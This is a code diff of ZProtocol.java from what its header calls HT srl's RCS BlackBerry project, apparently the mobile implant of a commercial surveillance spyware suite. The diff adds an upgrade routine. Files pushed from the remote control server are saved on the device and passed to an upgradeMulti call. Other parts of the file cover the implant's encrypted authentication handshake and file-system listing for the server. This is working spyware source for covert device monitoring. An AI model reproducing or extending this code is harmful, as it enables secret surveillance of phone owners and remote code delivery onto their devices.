@@ -1,21 +1,26 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2011
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+	
 package blackberry.action.sync.protocol;
 
 import java.io.EOFException;
 import java.util.Date;
 import java.util.Vector;
 
-import net.rim.device.api.crypto.Crypto;
 import net.rim.device.api.crypto.CryptoException;
 import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.crypto.SHA1Digest;
-import net.rim.device.api.util.ByteVector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.Status;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
-import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -33,7 +38,7 @@ public class ZProtocol extends Protocol {
 
     private static final int SHA1LEN = 20;
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ZProtocol", DebugLevel.NOTIFY);
+    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE);
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
@@ -41,6 +46,9 @@ public class ZProtocol extends Protocol {
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
+
+    boolean upgrade;
+    Vector upgradeFiles = new Vector();
 
     public boolean perform() {
         //#ifdef DBC
@@ -104,10 +112,25 @@ public class ZProtocol extends Protocol {
                 debug.info("***** Upload *****");
                 //#endif  
 
+                upgrade = false;
                 boolean left = true;
                 while (left) {
                     response = command(Proto.UPLOAD);
                     left = parseUpload(response);
+                }
+            }
+
+            if (capabilities[Proto.UPGRADE]) {
+                //#ifdef DEBUG
+                debug.info("***** Upgrade *****");
+                //#endif  
+
+                upgradeFiles.removeAllElements();
+
+                boolean left = true;
+                while (left) {
+                    response = command(Proto.UPGRADE);
+                    left = parseUpgrade(response);
                 }
             }
 
@@ -250,9 +273,7 @@ public class ZProtocol extends Protocol {
 
             // Retrieve Nonce and Cap
             byte[] cypherNonceCap = new byte[32];
-            Utils
-                    .copy(cypherNonceCap, 0, authResult, 32,
-                            cypherNonceCap.length);
+            Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);
 
             byte[] plainNonceCap = cryptoK.decryptData(cypherNonceCap);
             //#ifdef DEBUG
@@ -292,7 +313,6 @@ public class ZProtocol extends Protocol {
             //#endif
             throw new ProtocolException(13);
         }
-
     }
 
     protected byte[] forgeIdentification() {
@@ -480,9 +500,9 @@ public class ZProtocol extends Protocol {
                 //#ifdef DEBUG
                 debug.trace("parseUpload left: " + left);
                 //#endif
-                String file = WChar.readPascal(dataBuffer);
+                String filename = WChar.readPascal(dataBuffer);
                 //#ifdef DEBUG
-                debug.trace("parseUpload: " + file);
+                debug.trace("parseUpload: " + filename);
                 //#endif
 
                 int size = dataBuffer.readInt();
@@ -492,7 +512,80 @@ public class ZProtocol extends Protocol {
                 //#ifdef DEBUG
                 debug.trace("parseUpload: saving");
                 //#endif
-                Protocol.saveUpload(file, content);
+                Protocol.saveUpload(filename, content);
+
+                if (filename.equals(Protocol.UPGRADE_FILENAME_0)
+                        || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
+                    upgrade = true;
+                    //#ifdef DEBUG
+                    debug.trace("parseUpload: there's something to upgrade");
+                    //#endif
+                }
+
+                if (left == 0 && upgrade) {
+                    //#ifdef DEBUG
+                    debug.trace("parseUpload: last file, go to upgrade");
+                    //#endif
+                    upgradeMulti();
+                }
+
+                return left > 0;
+
+            } catch (EOFException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+                throw new ProtocolException();
+            }
+        } else if (res == Proto.NO) {
+            //#ifdef DEBUG
+            debug.trace("parseUpload, NO");
+            //#endif
+            return false;
+        } else {
+            //#ifdef DEBUG
+            debug.error("parseUpload, wrong answer: " + res);
+            //#endif
+            throw new ProtocolException();
+        }
+    }
+
+    protected boolean parseUpgrade(byte[] result) throws ProtocolException {
+
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res == Proto.OK) {
+            //#ifdef DEBUG
+            debug.trace("parseUpgrade, OK");
+            //#endif
+            DataBuffer dataBuffer = new DataBuffer(result, 4,
+                    result.length - 4, false);
+            try {
+                int totSize = dataBuffer.readInt();
+                int left = dataBuffer.readInt();
+                //#ifdef DEBUG
+                debug.trace("parseUpgrade left: " + left);
+                //#endif
+                String filename = WChar.readPascal(dataBuffer);
+                //#ifdef DEBUG
+                debug.trace("parseUpgrade: " + filename);
+                //#endif
+
+                int size = dataBuffer.readInt();
+                byte[] content = new byte[size];
+                dataBuffer.read(content);
+
+                //#ifdef DEBUG
+                debug.trace("parseUpgrade: saving");
+                //#endif
+                Protocol.saveUpload(filename, content);
+                upgradeFiles.addElement(filename);
+
+                if (left == 0) {
+                    //#ifdef DEBUG
+                    debug.trace("parseUpgrade: all file saved, proceed with upgrade");
+                    //#endif
+                    Protocol.upgradeMulti(upgradeFiles);
+                }
 
                 return left > 0;
 
@@ -530,9 +623,7 @@ public class ZProtocol extends Protocol {
                     int depth = dataBuffer.readInt();
                     String file = WChar.readPascal(dataBuffer);
                     //#ifdef DEBUG
-                    debug
-                            .trace("parseFileSystem: " + file + " depth: "
-                                    + depth);
+                    debug.trace("parseFileSystem: " + file + " depth: " + depth);
                     //#endif
 
                     // expanding $dir$
@@ -666,7 +757,6 @@ public class ZProtocol extends Protocol {
             //#endif
             throw new TransportException(9);
         }
-
     }
 
     //#ifdef ZNOSHA
@@ -680,20 +770,21 @@ public class ZProtocol extends Protocol {
         byte[] plainIn = cryptoK.decryptData(cypherIn);
         return plainIn;
     }
+
     //#endif
 
     private byte[] cypheredWriteReadSha(byte[] plainOut)
             throws TransportException, CryptoException {
         //#ifdef DEBUG
         debug.trace("cypheredWriteReadSha");
-        debug.trace("plainout: "+plainOut.length);
+        debug.trace("plainout: " + plainOut.length);
         //#endif
 
         byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
         //#ifdef DEBUG        
-        debug.trace("cypherOut: "+cypherOut.length);
+        debug.trace("cypherOut: " + cypherOut.length);
         //#endif
-        
+
         byte[] cypherIn = transport.command(cypherOut);
 
         if (cypherIn.length < SHA1LEN) {
@@ -705,7 +796,7 @@ public class ZProtocol extends Protocol {
 
         byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);
 
-       return plainIn;
+        return plainIn;
 
     }
 
